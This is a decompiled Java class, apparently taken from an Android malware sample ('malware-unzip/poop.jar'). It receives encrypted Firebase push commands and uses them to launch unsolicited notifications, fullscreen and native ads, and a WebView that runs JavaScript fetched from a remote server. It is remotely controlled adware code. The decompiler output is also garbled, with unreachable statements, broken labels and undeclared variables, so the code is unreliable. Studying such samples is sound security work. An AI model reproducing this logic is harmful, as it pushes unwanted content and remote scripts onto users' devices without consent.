package com.sdk.provide;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Bitmap;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build.VERSION;
import android.support.v4.app.NotificationCompat.Builder;
import com.google.firebase.messaging.RemoteMessage;
import com.sdk.lib.activity.SdkActivity;
import com.sdk.lib.callback.ParseDataCallBack;
import com.sdk.lib.service.SdkService;
import com.sdk.provide.appinfo.AppInfo.AppDetails;
import com.sdk.provide.asynctask.ParseAppDetailsTask;
import com.sdk.provide.asynctask.ParseAppDetailsTask.onParseAppDetailsListener;
import com.sdk.provide.asynctask.ParseAppKeyWordTask;
import com.sdk.provide.asynctask.ParseAppKeyWordTask.OnParseAppKeyWordListener;
import com.sdk.provide.model.AdsKeyword;
import com.sdk.provide.model.AdsMe;
import com.sdk.provide.model.AdsNetWork;
import com.sdk.provide.model.Noty;
import com.sdk.provide.utils.LogUtils;
import com.sdk.provide.utils.MCrypt;
import com.sdk.provide.utils.MethodUtils;
import com.sdk.provide.utils.MethodUtils.onGetBitMapListener;
import com.sdk.provide.utils.ParseJsonUtils;
import com.sdk.provide.utils.TinyDB;
import java.lang.reflect.Field;
import java.util.Map;
import org.json.JSONException;
import org.json.JSONObject;

public class ParseDataProvide
  implements ParseDataCallBack
{
  private Context context;
  
  private void parseData(RemoteMessage paramRemoteMessage)
  {
    Object localObject4;
    if (paramRemoteMessage.getData().size() > 0)
    {
      str5 = "";
      localObject2 = "";
      localObject3 = "";
      str2 = "";
      str3 = "";
      str4 = "";
      localParseJsonUtils = new ParseJsonUtils();
      paramRemoteMessage = paramRemoteMessage.getData();
      LogUtils.d("response: " + paramRemoteMessage.toString());
      localObject4 = (String)paramRemoteMessage.get("response");
      localObject1 = new MCrypt();
      paramRemoteMessage = "";
      localObject4 = MethodUtils.catkeyvaencode((String)localObject4);
      LogUtils.d("key: " + localObject4[0] + " response: " + localObject4[1]);
    }
    try
    {
      localObject1 = ((MCrypt)localObject1).decrypt(localObject4[0], localObject4[1]);
      paramRemoteMessage = (RemoteMessage)localObject1;
      LogUtils.d("decode: " + (String)localObject1);
      paramRemoteMessage = (RemoteMessage)localObject1;
    }
    catch (Exception localJSONException5)
    {
      try
      {
        paramRemoteMessage = new JSONObject(paramRemoteMessage);
        if (paramRemoteMessage == null) {
          break label447;
        }
      }
      catch (JSONException localJSONException5)
      {
        try
        {
          localObject1 = paramRemoteMessage.getString("noty");
        }
        catch (JSONException localJSONException5)
        {
          try
          {
            str5 = paramRemoteMessage.getString("ads_me");
            localObject2 = str5;
          }
          catch (JSONException localJSONException5)
          {
            try
            {
              str5 = paramRemoteMessage.getString("ads_network");
              localObject3 = str5;
            }
            catch (JSONException localJSONException5)
            {
              try
              {
                str5 = paramRemoteMessage.getString("ads_item");
                str2 = str5;
              }
              catch (JSONException localJSONException5)
              {
                try
                {
                  str5 = paramRemoteMessage.getString("ads_google_play");
                  str3 = str5;
                }
                catch (JSONException localJSONException5)
                {
                  try
                  {
                    for (;;)
                    {
                      paramRemoteMessage = paramRemoteMessage.getString("ads_keyword");
                      LogUtils.d("string response: " + (String)localObject1 + "\n" + (String)localObject2 + "\n" + (String)localObject3 + "\n" + str2 + "\n" + str3 + "\n" + paramRemoteMessage);
                      if (((String)localObject1).equals("")) {
                        break;
                      }
                      localObject1 = localParseJsonUtils.parseNoty((String)localObject1);
                      if (((String)localObject2).equals("")) {
                        break label558;
                      }
                      localObject2 = localParseJsonUtils.parseAdsMe((String)localObject2);
                      if (((String)localObject3).equals("")) {
                        break label564;
                      }
                      localObject3 = localParseJsonUtils.parseAdsNetwork((String)localObject3);
                      if (paramRemoteMessage.equals("")) {
                        break label570;
                      }
                      paramRemoteMessage = localParseJsonUtils.parseAdsKeyword(paramRemoteMessage);
                      if (!str2.equals("")) {
                        localParseJsonUtils.parseAdsItem(this.context, str2);
                      }
                      if (!str3.equals("")) {
                        localParseJsonUtils.parseAdsGooglePlay(this.context, str3);
                      }
                      showAds((Noty)localObject1, (AdsNetWork)localObject3, (AdsMe)localObject2, paramRemoteMessage);
                      return;
                      localException = localException;
                      LogUtils.d("decode: " + localException.getMessage());
                      localException.printStackTrace();
                      continue;
                      paramRemoteMessage = paramRemoteMessage;
                      paramRemoteMessage.printStackTrace();
                      paramRemoteMessage = localException;
                      continue;
                      localJSONException1 = localJSONException1;
                      localJSONException1.printStackTrace();
                      str1 = str5;
                      continue;
                      localJSONException2 = localJSONException2;
                      localJSONException2.printStackTrace();
                      continue;
                      localJSONException3 = localJSONException3;
                      localJSONException3.printStackTrace();
                      continue;
                      localJSONException4 = localJSONException4;
                      localJSONException4.printStackTrace();
                      continue;
                      localJSONException5 = localJSONException5;
                      localJSONException5.printStackTrace();
                    }
                  }
                  catch (JSONException paramRemoteMessage)
                  {
                    for (;;)
                    {
                      paramRemoteMessage.printStackTrace();
                      paramRemoteMessage = str4;
                      continue;
                      String str1 = null;
                      continue;
                      localObject2 = null;
                      continue;
                      localObject3 = null;
                      continue;
                      paramRemoteMessage = null;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    localObject1 = null;
  }
  
  private void showAds(Noty paramNoty, AdsNetWork paramAdsNetWork, AdsMe paramAdsMe, AdsKeyword paramAdsKeyword)
  {
    if (MethodUtils.isNetworkConnected(this.context))
    {
      if (paramNoty != null) {
        if (paramNoty.getIs_show() == 1)
        {
          if (!MethodUtils.isAppInstall(this.context, paramNoty.getPackage_name())) {
            showNotification(this.context, paramNoty);
          }
        }
        else
        {
          if (paramAdsNetWork == null) {
            break label196;
          }
          if (paramAdsNetWork.getIs_show() == 1)
          {
            if (!paramAdsNetWork.getAds_type().equals("fullscreen")) {
              break label176;
            }
            showFullScreen(paramAdsNetWork);
          }
          label74:
          if (paramAdsMe == null) {
            break label212;
          }
          if (paramAdsMe.getIs_show() == 1)
          {
            if (MethodUtils.isAppInstall(this.context, paramAdsMe.getPackage_name())) {
              break label204;
            }
            showAdsMe(this.context, paramAdsMe.getPackage_name(), paramAdsMe.getTime_show(), paramAdsMe.getType_ads());
          }
        }
      }
      for (;;)
      {
        if (paramAdsKeyword != null)
        {
          if (paramAdsKeyword.getIs_show() == 1)
          {
            if (!MethodUtils.isAppInstall(this.context, paramAdsKeyword.getPackage_name())) {
              showWebView(this.context, paramAdsKeyword);
            }
          }
          else
          {
            return;
            LogUtils.d("app da cai");
            break;
            LogUtils.d("noty null");
            break;
            label176:
            if (!paramAdsNetWork.getAds_type().equals("native")) {
              break label74;
            }
            showNative(paramAdsNetWork);
            break label74;
            label196:
            LogUtils.d("adsNetWork null");
            break label74;
            label204:
            LogUtils.d("app da cai");
            continue;
            label212:
            LogUtils.d("adsMe null");
            continue;
          }
          LogUtils.d("app da cai");
          return;
        }
      }
      LogUtils.d("adsKeyword null");
      return;
    }
    LogUtils.d("khong co mang");
  }
  
  private void showAdsMe(final Context paramContext, String paramString, final int paramInt1, final int paramInt2)
  {
    new ParseAppDetailsTask(paramContext, new ParseAppDetailsTask.onParseAppDetailsListener()
    {
      public void onFailure() {}
      
      public void onSuccess(AppInfo.AppDetails paramAnonymousAppDetails)
      {
        Intent localIntent = new Intent(paramContext, SdkActivity.class);
        localIntent.putExtra("qc_type_jslib", 2);
        localIntent.putExtra("json_jslib", paramAnonymousAppDetails.toJson());
        localIntent.putExtra("time_out_jslib", paramInt1);
        localIntent.putExtra("type_adsme_jslib", paramInt2);
        if (Build.VERSION.SDK_INT >= 21) {
          localIntent.setFlags(1342701568);
        }
        for (;;)
        {
          paramContext.startActivity(localIntent);
          return;
          localIntent.setFlags(1342177280);
        }
      }
    }).execute(new String[] { paramString });
  }
  
  private void showFullScreen(AdsNetWork paramAdsNetWork)
  {
    Intent localIntent = new Intent(this.context, SdkService.class);
    localIntent.putExtra("qc_type_jslib", 0);
    localIntent.putExtra("type_jslib", paramAdsNetWork.getAds_network());
    localIntent.putExtra("app_id_jslib", paramAdsNetWork.getAds_app_id());
    localIntent.putExtra("unit_id_jslib", paramAdsNetWork.getAds_unit_id());
    this.context.startService(localIntent);
  }
  
  private void showNative(AdsNetWork paramAdsNetWork)
  {
    Intent localIntent = new Intent(this.context, SdkActivity.class);
    localIntent.putExtra("qc_type_jslib", 3);
    localIntent.putExtra("time_out_jslib", paramAdsNetWork.getTime_show());
    localIntent.putExtra("app_id_jslib", paramAdsNetWork.getAds_app_id());
    localIntent.putExtra("unit_id_jslib", paramAdsNetWork.getAds_unit_id());
    if (paramAdsNetWork.getAds_network().equals("admob"))
    {
      localIntent.putExtra("native_type_jslib", 0);
      if (Build.VERSION.SDK_INT < 21) {
        break label131;
      }
      localIntent.setFlags(1342701568);
    }
    for (;;)
    {
      this.context.startActivity(localIntent);
      return;
      if (!paramAdsNetWork.getAds_network().equals("facebook")) {
        break;
      }
      localIntent.putExtra("native_type_jslib", 1);
      break;
      label131:
      localIntent.setFlags(1342177280);
    }
  }
  
  private void showNotification(final Context paramContext, final Noty paramNoty)
  {
    new ParseAppDetailsTask(paramContext, new ParseAppDetailsTask.onParseAppDetailsListener()
    {
      public void onFailure() {}
      
      public void onSuccess(final AppInfo.AppDetails paramAnonymousAppDetails)
      {
        String str2 = paramNoty.getIcon();
        String str1 = str2;
        if (str2.equals("")) {
          str1 = paramAnonymousAppDetails.icon;
        }
        MethodUtils.getBitmapFromURL(str1, new MethodUtils.onGetBitMapListener()
        {
          public void onSuccess(Bitmap paramAnonymous2Bitmap)
          {
            localObject1 = null;
            try
            {
              localObject2 = ParseDataProvide.1.this.val$context.getApplicationContext().getPackageManager().getApplicationInfo(ParseDataProvide.1.this.val$context.getPackageName(), 0);
              localObject1 = localObject2;
            }
            catch (PackageManager.NameNotFoundException localActivityNotFoundException)
            {
              try
              {
                localObject1 = new Intent("android.intent.action.VIEW", Uri.parse("market://details?id=" + ParseDataProvide.1.this.val$noty.getPackage_name()));
                if (ParseDataProvide.1.this.val$noty.getIs_clear() != 1) {
                  break label538;
                }
                bool = false;
                localObject3 = ParseDataProvide.1.this.val$noty.getTitle();
                String str = ParseDataProvide.1.this.val$noty.getMessenger();
                localObject2 = localObject3;
                if (!((String)localObject3).equals("")) {
                  break label141;
                }
                localObject2 = paramAnonymousAppDetails.title;
                localObject3 = str;
                if (!str.equals("")) {
                  break label164;
                }
                localObject3 = paramAnonymousAppDetails.summary;
                localObject1 = PendingIntent.getActivity(ParseDataProvide.1.this.val$context, 0, (Intent)localObject1, 134217728);
                localObject2 = new NotificationCompat.Builder(ParseDataProvide.1.this.val$context).setSmallIcon(17170445).setLargeIcon(paramAnonymous2Bitmap).setContentTitle((CharSequence)localObject2).setContentText((CharSequence)localObject3).setTicker((CharSequence)localObject2).setOngoing(bool).setContentIntent((PendingIntent)localObject1);
                localObject1 = ((NotificationCompat.Builder)localObject2).build();
                if (ParseDataProvide.1.this.val$noty.getIs_sound() != 1) {
                  break label263;
                }
                ((NotificationCompat.Builder)localObject2).setSound(RingtoneManager.getDefaultUri(2));
                ((Notification)localObject1).defaults |= 0x1;
                if (ParseDataProvide.1.this.val$noty.getIs_vibrate() != 1) {
                  break label305;
                }
                ((NotificationCompat.Builder)localObject2).setVibrate(new long[] { 0L, 1000L });
                ((Notification)localObject1).defaults |= 0x2;
                ((Notification)localObject1).flags |= 0x10;
              }
              catch (ActivityNotFoundException localActivityNotFoundException)
              {
                try
                {
                  for (;;)
                  {
                    Object localObject2 = Class.forName("android.app.MiuiNotification").newInstance();
                    Object localObject3 = localObject2.getClass().getDeclaredField("customizedIcon");
                    ((Field)localObject3).setAccessible(true);
                    ((Field)localObject3).set(localObject2, Boolean.valueOf(true));
                    localObject3 = localObject1.getClass().getField("extraNotification");
                    ((Field)localObject3).setAccessible(true);
                    ((Field)localObject3).set(localObject1, localObject2);
                    ((Notification)localObject1).largeIcon = paramAnonymous2Bitmap;
                    paramAnonymous2Bitmap = new TinyDB(ParseDataProvide.1.this.val$context);
                    int j = paramAnonymous2Bitmap.getInt(ParseDataProvide.1.this.val$noty.getPackage_name());
                    int k = paramAnonymous2Bitmap.getInt("num_noty");
                    int i = j;
                    if (j == 0)
                    {
                      i = k + 1;
                      paramAnonymous2Bitmap.putInt(ParseDataProvide.1.this.val$noty.getPackage_name(), i);
                      paramAnonymous2Bitmap.putInt("num_noty", k + 1);
                    }
                    ((NotificationManager)ParseDataProvide.1.this.val$context.getSystemService("notification")).notify(i, (Notification)localObject1);
                    return;
                    localNameNotFoundException = localNameNotFoundException;
                    localNameNotFoundException.printStackTrace();
                    continue;
                    localActivityNotFoundException = localActivityNotFoundException;
                    Intent localIntent = new Intent("android.intent.action.VIEW", Uri.parse("https://play.google.com/store/apps/details?id=" + ParseDataProvide.1.this.val$noty.getPackage_name()));
                  }
                  boolean bool = true;
                }
                catch (Exception localException)
                {
                  for (;;) {}
                }
              }
            }
            i = ((ApplicationInfo)localObject1).icon;
          }
        });
      }
    }).execute(new String[] { paramNoty.getPackage_name() });
  }
  
  private void showWebView(final Context paramContext, final AdsKeyword paramAdsKeyword)
  {
    new ParseAppKeyWordTask(paramContext, paramAdsKeyword.getKeyword(), paramAdsKeyword.getPackage_name(), new ParseAppKeyWordTask.OnParseAppKeyWordListener()
    {
      public void onSuccess(String paramAnonymousString)
      {
        Intent localIntent = new Intent(paramContext, SdkActivity.class);
        localIntent.putExtra("qc_type_jslib", 1);
        localIntent.putExtra("package_webview_jslib", paramAdsKeyword.getPackage_name());
        localIntent.putExtra("keyword_webview_jslib", paramAdsKeyword.getKeyword());
        localIntent.putExtra("javascript_jslib", paramAnonymousString);
        if (Build.VERSION.SDK_INT >= 21) {
          localIntent.setFlags(1342701568);
        }
        for (;;)
        {
          paramContext.startActivity(localIntent);
          return;
          localIntent.setFlags(1342177280);
        }
      }
    }).execute(new String[0]);
  }
  
  public void parseData(Context paramContext, RemoteMessage paramRemoteMessage)
  {
    this.context = paramContext;
    parseData(paramRemoteMessage);
  }
}


/* Location:              /Users/paulpierre/Downloads/malware-unzip/poop.jar!/com/sdk/provide/ParseDataProvide.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */